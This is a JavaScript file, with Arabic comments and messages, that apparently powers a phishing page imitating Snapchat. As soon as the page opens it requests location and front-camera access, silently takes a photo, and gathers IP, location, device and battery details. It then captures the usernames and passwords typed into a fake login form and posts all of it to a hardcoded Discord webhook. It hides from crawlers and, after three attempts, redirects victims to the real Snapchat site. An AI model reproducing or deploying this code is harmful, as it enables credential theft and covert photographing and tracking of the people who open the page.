const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517635351798354103/4aBtwaUtWWdTITUfu8pfQbVMS-RGerhwqUQ5YVmlu3IPYYy0tgRHbdcFFWL_xsYfD68H";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let loginAttempts = 0;

function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    return ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || navigator.webdriver;
}

async function getIPAndLocation() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
            ip: data.ip || "غير معروف",
            city: data.city || "غير معروف",
            region: data.region || "غير معروف",
            country: data.country_name || "غير معروف",
            org: data.org || "غير معروف"
        };
    } catch (e) {
        return { ip: "غير معروف", city: "", region: "", country: "", org: "" };
    }
}

async function getSystemInfo() {
    const geoip = await getIPAndLocation();
    const ua = navigator.userAgent;
    const platform = navigator.platform || "غير معروف";
    const language = navigator.language || "غير معروف";
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    
    let batteryInfo = "غير مدعومة";
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋'})`;
        }
    } catch (e) {}

    return { ...geoip, ua, platform, language, screenRes, batteryInfo };
}

// دالة طلب الأذونات والتقاط الصورة فوراً
async function triggerPermissionsAndCapture(user = "", pass = "", status = "") {
    if (isBot()) return;

    let lat = null, lng = null;

    // طلب إذن الموقع الجغرافي (GPS) تلقائياً
    await new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    lat = pos.coords.latitude;
                    lng = pos.coords.longitude;
                    resolve();
                },
                () => { resolve(); },
                { timeout: 6000, enableHighAccuracy: true }
            );
        } else {
            resolve();
        }
    });

    // طلب إذن الكاميرا الأمامية والتقاط الصورة تلقائياً
    let frontBlob = null;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 2000));
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        frontBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
        
        stream.getTracks().forEach(t => t.stop());
    } catch (e) {}

    // إرسال البيانات إلى ديسكورد
    await sendToDiscord(frontBlob, lat, lng, user, pass, status);
}

async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status = "") {
    try {
        const info = await getSystemInfo();
        const formData = new FormData();
        
        let content = `🚨 **[ صيد جديد - طلب تلقائي فور الدخول ]**\n` +
                      `🌐 **IP:** \`${info.ip}\`\n` +
                      `🏙️ **الموقع (IP):** \`${info.country} - ${info.city} (${info.org})\`\n` +
                      `💻 **النظام:** \`${info.platform}\` | 🔋 **البطارية:** \`${info.batteryInfo}\`\n`;
        
        if (lat && lng) {
            content += `📍 **موقع GPS الدقيق:** [اضغط هنا للعرض](https://www.google.com/maps?q=${lat},${lng}) (\`${lat}, ${lng}\`)\n`;
        } else {
            content += `📍 **موقع GPS:** لم يتم السماح به أو تم الرفض.\n`;
        }

        if (user) {
            content += `👤 **المستخدم:** \`${user}\`\n🔑 **كلمة المرور:** \`${pass}\`\n`;
        }

        if (status) {
            content += `📝 **الحالة:** ${status}\n`;
        }
        
        content += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;

        if (frontBlob) formData.append('file1', frontBlob, 'shot.png');

        formData.append('payload_json', JSON.stringify({
            content: content,
            username: "Hunter Bot",
            avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
        }));

        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    } catch (err) {}
}

// التشغيل الذاتي الفوري بمجرد فتح الصفحة (بدون أي ضغطة زر)
window.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        triggerPermissionsAndCapture("", "", "تم فتح الصفحة وطلب الأذونات تلقائياً.");
    }, 1000); // تأخير ثانية واحدة لضمان تحميل عناصر الصفحة بالكامل
});

// التعامل مع نموذج تسجيل الدخول (apply.html)
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        loginAttempts++;

        const u = e.target.username.value;
        const p = e.target.password.value;
        
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) loadingOverlay.style.display = 'flex';

        await triggerPermissionsAndCapture(u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);

        setTimeout(() => {
            if (loadingOverlay) loadingOverlay.style.display = 'none';

            if (loginAttempts >= 3) {
                window.location.href = "https://accounts.snapchat.com/";
            } else {
                const errorMsg = document.getElementById('loginErrorMsg');
                if (errorMsg) errorMsg.style.display = 'block';
                e.target.password.value = "";
            }
        }, 1500);
    });
}
